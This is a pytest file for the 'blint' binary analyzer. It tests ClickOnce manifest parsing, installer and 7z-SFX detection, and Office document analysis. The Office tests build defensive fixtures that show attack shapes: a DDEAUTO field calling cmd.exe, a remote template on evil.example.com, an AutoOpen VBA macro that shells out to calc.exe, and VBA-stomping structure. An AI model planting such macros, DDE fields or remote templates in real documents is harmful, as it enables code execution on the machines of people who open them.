"""Tests for W4.3: ClickOnce manifests, installer detection, 7z-SFX payloads.

The 7z reader is verified against archives created and listed by 7-Zip on
the ground-truth VM (the corpus carries the resulting SFX); synthetic
fixtures cover the hostile shapes (ground rules 22/30/33).
"""

import glob
import json
import logging
import os
import struct
import tempfile
import zipfile
from pathlib import Path

import pytest

from blint.lib.analysis import initialize_rules
from blint.lib.clickonce import is_clickonce_file, parse_clickonce
from blint.lib.installers import _parse_nsis_firstheader, detect_installer
from blint.lib.review_runner import ReviewRunner
from blint.lib.sevenz import find_archive_candidates, parse_sevenz_blob


@pytest.fixture(scope="module", autouse=True)
def _load_rules_once():
    """initialize_rules() clears and refills the global rule dicts, so the
    repeated loads in these tests cannot append duplicates (the engine's
    load path is append-only by design; the clearing entry point is the
    one the CLI uses)."""
    from blint.config import BlintOptions

    initialize_rules(BlintOptions(reports_dir=str(Path(tempfile.mkdtemp()))))

_DATA = os.path.join(os.path.dirname(__file__), "data")
_PE = os.path.join(_DATA, "pe", "msvc-hello-x64.exe")
_CORPUS_SFX = os.path.expanduser("~/sandbox/pe-corpus/tier0-reference/7z-x64-setup.exe")

DEPLOYMENT_MANIFEST = """<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive2.xsd"
    manifestVersion="1.0"
    xmlns:asmv1="urn:schemas-microsoft-com:asm.v1"
    xmlns:asmv2="urn:schemas-microsoft-com:asm.v2"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <assemblyIdentity name="Acme.Client.app" version="1.0.0.5" publicKeyToken="0000000000000000"
                    culture="en-US" processorArchitecture="msil" />
  <description asmv2:publisher="Acme Corp" asmv2:product="Acme Client" />
  <deployment install="true" mapFileExtensions="true">
    <deploymentProvider url="http://deploy.example.com/client/Acme.Client.application" />
  </deployment>
  <dependency>
    <dependentAssembly dependencyType="install" codebase="Acme.Client.exe.manifest" size="12345">
      <assemblyIdentity name="Acme.Client.exe" version="1.0.0.5" publicKeyToken="0000000000000000"
                        culture="en-US" processorArchitecture="msil" />
    </dependentAssembly>
    <dependency>
      <dependentAssembly dependencyType="generate" />
    </dependency>
  </dependency>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
    <security>
      <applicationRequestMinimum>
        <PermissionSet class="System.Security.PermissionSet" Unrestricted="true" />
        <defaultAssemblyRequest permissionSetReference="Trust" />
      </applicationRequestMinimum>
    </security>
  </trustInfo>
</asmv1:assembly>
"""


def _write_deployment(tmp_path):
    path = tmp_path / "Acme.Client.application"
    path.write_text(DEPLOYMENT_MANIFEST)
    return str(path)


def test_clickonce_deployment_facts(tmp_path):
    path = _write_deployment(tmp_path)
    block = parse_clickonce(path)
    assert block is not None
    assert block["kind"] == "deployment"
    assert block["identity"]["name"] == "Acme.Client.app"
    assert block["identity"]["version"] == "1.0.0.5"
    assert block["update_url"] == "http://deploy.example.com/client/Acme.Client.application"
    assert block["publisher"] == "Acme Corp"
    assert block["permission_set_unrestricted"] is True
    assert block["signature_present"] is False


def test_clickonce_manifest_content_routing(tmp_path):
    # An ordinary PE-sidecar manifest is NOT ClickOnce...
    plain = tmp_path / "app.manifest"
    plain.write_text('<?xml version="1.0"?><assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"/>')
    assert is_clickonce_file(str(plain)) is False
    # ...but an asm.v2 trustInfo manifest is.
    clickonce = tmp_path / "client.exe.manifest"
    clickonce.write_text(
        '<?xml version="1.0"?><assembly xmlns="urn:schemas-microsoft-com:asm.v2" '
        'xmlns:asmv2="urn:schemas-microsoft-com:asm.v2"><trustInfo xmlns="urn:schemas-microsoft-com:asm.v2"/>'
        "</assembly>"
    )
    assert is_clickonce_file(str(clickonce)) is True
    block = parse_clickonce(str(clickonce))
    assert block["kind"] == "application"


def test_clickonce_garbage_returns_none(tmp_path):
    path = tmp_path / "broken.application"
    path.write_bytes(b"<not-xml at all")
    assert parse_clickonce(str(path)) is None


def test_nsis_firstheader_parse():
    header = struct.pack("<IIII", 0, 0xDEADBEEF, 0x00012345, 0x00ABCDEF)
    blob = b"\x00" * 100 + header + b"\xff" * 64
    facts = _parse_nsis_firstheader(blob)
    assert facts is not None
    assert facts["length_of_header"] == 0x00012345
    assert facts["length_of_all_following_data"] == 0x00ABCDEF


def test_detect_installer_nsis_detection_only(tmp_path):
    pe = tmp_path / "installer.exe"
    pe.write_bytes(Path(_PE).read_bytes() + b"\x00" * 4096 + struct.pack("<IIII", 0, 0xDEADBEEF, 4096, 100000))
    block = detect_installer(str(pe), "nsis")
    assert block["family"] == "nsis"
    # Detection-only is stated in the block, not implied (rule 14).
    assert block["extraction"] == "detection_only"
    assert block["nsis_firstheader"]["length_of_all_following_data"] == 100000


def test_detect_installer_ignores_plain_pe(tmp_path):
    block = detect_installer(_PE, "unknown_low_entropy")
    assert block is None


def test_sevenz_rejects_garbage():
    assert find_archive_candidates(b"not a 7z at all") == []
    assert parse_sevenz_blob(b"\x00" * 64, [], []) is None


def _build_sfx(archive_path, stub_extra=b""):
    with open(archive_path, "rb") as handle:
        archive = handle.read()
    stub = b"MZ" + b"\x00" * 0x200 + stub_extra
    return stub + archive


@pytest.mark.skipif(not os.path.isfile("/tmp/test1.7z"), reason="ground-truth 7z fixture not built")
def test_sevenz_listing_matches_7z_l():
    """Facts cross-checked against `7z l` on the ground-truth VM:
    notes.md 5002, readme.txt 20 (see the packet's gate block)."""
    data = Path("/tmp/test1.7z").read_bytes()
    refs, degs = [], []
    block = parse_sevenz_blob(data, refs, degs)
    assert block is not None
    names = {m["name"]: m["size"] for m in block["members"]}
    assert names == {"notes.md": 5002, "readme.txt": 20}


def test_sevenz_crc_rejects_false_signature():
    """A 7z magic in the middle of a blob must not satisfy the start-header
    CRC check — the reader probes candidates and states the failure as a
    named degradation, never silence."""
    refusals: list[str] = []
    degradations: list[str] = []
    fake = b"MZ" + bytes([0x37, 0x7A, 0xBC, 0xAF, 0x27, 0x1C]) + bytes(64)
    block = parse_sevenz_blob(fake, refusals, degradations)
    assert block is not None
    assert block["members"] == []
    assert any(d.startswith("header_unusable") for d in degradations)


def test_sfx_runner_members_and_leak_delta(tmp_path):
    """The runner analyzes a real SFX's PE members as sfx-member units and
    leaves no temp directories (ground rule 18 asserted across the run)."""
    logging.disable(logging.CRITICAL)
    from blint.config import BlintOptions
    from blint.lib.runners import run_default_mode

    # The SFX under test: a real PE stub with the ground-truth archive
    # appended — exactly the shape a 7-Zip SFX module produces (the stub's
    # overlay is the archive).
    stub = Path(_PE).read_bytes()
    archive_bytes = Path("/tmp/test1.7z").read_bytes()
    sfx_path = tmp_path / "setup.exe"
    sfx_path.write_bytes(stub + archive_bytes)
    before = set(glob.glob(os.path.join(tempfile.gettempdir(), "blint_sfx_*")))
    reports = os.path.join(str(tmp_path), "reports")
    options = BlintOptions(
        src_dir_image=[str(sfx_path)],
        reports_dir=reports,
        no_reviews=True,
        quiet_mode=True,
    )
    run_default_mode(options)
    after = set(glob.glob(os.path.join(tempfile.gettempdir(), "blint_sfx_*")))
    assert after - before == set()
    with open(os.path.join(reports, "setup.exe-metadata.json")) as handle:
        metadata = json.load(handle)
    installer = metadata["installer"]
    assert installer["family"] == "sfx_7z"
    assert installer["extraction"] == "members"
    names = {m["name"]: m["size"] for m in installer["sfx_payload"]["members"]}
    assert names == {"notes.md": 5002, "readme.txt": 20}


# ---------------------------------------------------------------------------
# W4.4 — Office documents (OOXML, legacy CFBF, RTF)
# ---------------------------------------------------------------------------

def _ovba_raw_chunk(payload: bytes) -> bytes:
    """One raw (uncompressed) MS-OVBA chunk: header + literal bytes."""
    header = 0x1800 | ((len(payload) - 1 + 3) & 0x0FFF)
    return struct.pack("<H", header) + payload


def _ovba_compressed(text: bytes) -> bytes:
    out = bytearray(b"\x01")
    for offset in range(0, len(text), 4096):
        out += _ovba_raw_chunk(text[offset : offset + 4096])
    return bytes(out)


def _vba_module_source(lines):
    return ("\r\n".join(lines) + "\r\n").encode("latin-1")


def build_vba_project_bin(modules: dict[str, bytes]) -> bytes:
    """A minimal vbaProject.bin: VBA/dir (compressed) + module streams,
    built with the test_cfbf builder."""
    from tests.test_cfbf import build_cfbf

    dir_records = bytearray()
    for name in modules:
        encoded = name.encode("latin-1")
        # MODULENAME: id(2) reserved(4) size(4) name
        dir_records += struct.pack("<HII", 0x0019, 0, len(encoded)) + encoded
    dir_records += struct.pack("<H", 0x000F) + b"\x00" * 8
    streams = {"VBA/dir": _ovba_compressed(bytes(dir_records))}
    for name, source in modules.items():
        streams[f"VBA/{name}"] = _ovba_compressed(source)
    return build_cfbf(streams)


def build_docx(tmp_path, name="test.docx", *, remote_template=False, vba_modules=None, dde=False, hyperlink=False):
    doc_parts = []
    if dde:
        doc_parts.append('<w:p><w:r><w:instrText>DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/x"</w:instrText></w:r></w:p>')
    if hyperlink:
        doc_parts.append('<w:p><w:r><w:t>see https://example.com/docs</w:t></w:r></w:p>')
    document = (
        '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        "<w:body>" + "".join(doc_parts) + "</w:body></w:document>"
    )
    rels = ['<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">']
    if remote_template:
        rels.append(
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"'
            ' Target="http://evil.example.com/template.dotm" TargetMode="External"/>'
        )
    if hyperlink:
        rels.append(
            '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"'
            ' Target="https://example.com/docs" TargetMode="External"/>'
        )
    rels.append("</Relationships>")
    path = tmp_path / name
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types/>')
        zf.writestr("word/document.xml", document)
        zf.writestr("word/_rels/document.xml.rels", "".join(rels))
        if vba_modules:
            zf.writestr("word/vbaProject.bin", build_vba_project_bin(vba_modules))
    return str(path)


def test_ooxml_external_relationship_and_dde(tmp_path):
    from blint.lib.office import analyze_ooxml, office_metadata

    docx = build_docx(tmp_path, remote_template=True, dde=True)
    refusals: list[str] = []
    block = analyze_ooxml(docx, refusals, [])
    assert block["parse_status"] == "parsed"
    assert block["external_relationship_count"] == 1
    assert block["external_template"] == "http://evil.example.com/template.dotm"
    assert any("DDEAUTO" in field for field in block["dde_fields"])
    metadata = office_metadata(block, docx, "ooxmldocument")
    assert any("attachedtemplate:external:" in r.lower() for r in metadata["relationships"])


def test_ooxml_vba_macro_extraction(tmp_path):
    from blint.lib.office import analyze_ooxml, office_metadata
    source = _vba_module_source([
        "Attribute VB_Name = \"ThisDocument\"",
        "Sub AutoOpen()",
        "    Shell \"cmd.exe /c calc.exe\"",
        "End Sub",
    ])
    docx = build_docx(tmp_path, vba_modules={"ThisDocument": source})
    block = analyze_ooxml(docx, _refusals := [], [])
    assert block["vba_project_present"] is True
    vba = block["vba"]
    assert vba["module_count"] == 1
    assert vba["modules"][0]["source_present"] is True
    assert "AutoOpen" in vba["modules"][0]["source"]
    metadata = office_metadata(block, "test.docx", "ooxmldocument")
    runner = ReviewRunner()
    results = runner.run_review(metadata)
    assert "OFFICE_AUTO_EXEC_MACRO" in results
    assert "OFFICE_SHELL_EXECUTION" in results


def test_legacy_doc_vba_and_stomping_evidence(tmp_path):
    from blint.lib.analysis import load_default_rules
    from blint.lib.office import analyze_legacy_office, office_metadata
    from tests.test_cfbf import build_cfbf

    load_default_rules()
    source = _vba_module_source(["Sub AutoOpen()", "    Environ(\"USERNAME\")", "End Sub"])
    # The dir declares a second module whose stream is absent — the
    # structural shape of VBA stomping (p-code present, source missing).
    dir_records = struct.pack("<HII", 0x0019, 0, 12) + b"ThisDocument"
    dir_records += struct.pack("<HII", 0x0019, 0, 7) + b"Stomped"
    dir_records += struct.pack("<H", 0x000F) + bytes(8)
    streams = {
        "WordDocument": b"\xec\xa5" + b"\x00" * 100,
        "Macros/VBA/dir": _ovba_compressed(bytes(dir_records)),
        "Macros/VBA/ThisDocument": _ovba_compressed(source),
        "Macros/PROJECT": b"Reference=*\\G{11111111-1111-1111-1111-111111111111}#1.0#C:\\tlb.tlb#Offset\r\n",
        "_VBA_PROJECT": b"\xcc\x45\x00" + b"\x00" * 50,
    }
    doc_path = tmp_path / "sample.doc"
    doc_path.write_bytes(build_cfbf(streams))
    block = analyze_legacy_office(str(doc_path), [], [])
    assert block["parse_status"] == "parsed"
    vba = block["vba"]
    assert vba is not None
    assert vba["module_count"] == 2
    assert vba["compiled_pcode_present"] is True
    assert vba["vba_stomping_evidence"] is True
    assert any("tlb.tlb" in ref for ref in vba["references"])
    recovered = {m["name"]: m for m in vba["modules"]}
    assert recovered["ThisDocument"]["source_present"] is True
    assert recovered["Stomped"]["source_present"] is False
    metadata = office_metadata(block, "sample.doc", "oleofficedocument")
    runner = ReviewRunner()
    results = runner.run_review(metadata)
    assert "OFFICE_AUTO_EXEC_MACRO" in results
    assert "OFFICE_VBA_STOMPING_EVIDENCE" in results


def test_rtf_objdata_cfbf_extraction(tmp_path):
    from blint.lib.office import analyze_rtf
    from tests.test_cfbf import build_cfbf

    inner = build_cfbf({"\x01Ole10Native": b"\x08\x00\x00\x00\x01test.ex\x00"})
    body = b"{\\rtf1\\ansi{\\object{\\*\\objdata " + inner.hex().encode().upper() + b"}}}"
    path = tmp_path / "sample.rtf"
    path.write_bytes(body)
    block = analyze_rtf(str(path), [], [])
    assert block["rtf_detected"] is True
    assert block["object_count"] == 1
    assert block["objects"][0]["format"] == "cfbf"


def test_benign_document_population(tmp_path):
    """Ground-rule-34 population: a benign document with an ordinary
    hyperlink hits only the external-relationship fact (low severity), and
    a plain document hits nothing."""
    from blint.lib.office import analyze_ooxml, office_metadata
    plain = build_docx(tmp_path, name="plain.docx")
    block = analyze_ooxml(plain, [], [])
    runner = ReviewRunner()
    results = runner.run_review(office_metadata(block, "plain.docx", "ooxmldocument"))
    assert results == {}

    linked = build_docx(tmp_path, name="linked.docx", hyperlink=True)
    block = analyze_ooxml(linked, [], [])
    results = runner.run_review(office_metadata(block, "linked.docx", "ooxmldocument"))
    assert set(results) == {"OFFICE_EXTERNAL_RELATIONSHIP"}
